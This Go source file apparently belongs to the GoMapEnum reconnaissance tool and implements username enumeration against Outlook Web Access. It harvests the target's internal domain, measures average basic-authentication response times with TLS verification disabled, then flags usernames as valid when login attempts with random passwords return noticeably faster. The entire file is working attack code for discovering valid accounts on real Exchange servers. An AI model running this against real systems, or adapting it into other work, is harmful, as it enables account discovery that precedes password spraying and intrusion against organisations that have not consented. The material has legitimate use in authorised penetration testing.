package owa

import (
	"GoMapEnum/src/utils"
	"crypto/tls"
	"fmt"
	"net/http"
	"time"
)

func InitAndAverageResponseTime(optionsInterface *interface{}) {
	options := (*optionsInterface).(*Options)
	// Prepare the transport for all the requests
	tr := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		Proxy:           options.Proxy,
	}
	options.tr = tr
	options.urlToHarvest = options.getURIToAuthenticate(options.Target)
	options.internalDomain = options.harvestInternalDomain(options.urlToHarvest)
	options.avgResponse = options.basicAuthAvgTime(options.urlToHarvest, options.internalDomain)
	options.Log.Info("Internal Domain: " + options.internalDomain)
}

func UserEnum(optionsInterface *interface{}, username string) bool {
	pass := utils.RandomString(5)
	options := (*optionsInterface).(*Options)

	startTime := time.Now()
	options.webRequestBasicAuth(options.urlToHarvest, options.internalDomain+"\\"+username, pass)
	elapsedTime := time.Since(startTime)

	if float64(elapsedTime) < float64(options.avgResponse)*0.77 {
		options.Log.Success(username + " - " + elapsedTime.String())
		return true
	} else {
		options.Log.Fail(username + " - " + fmt.Sprint(elapsedTime))
		return false
	}
}
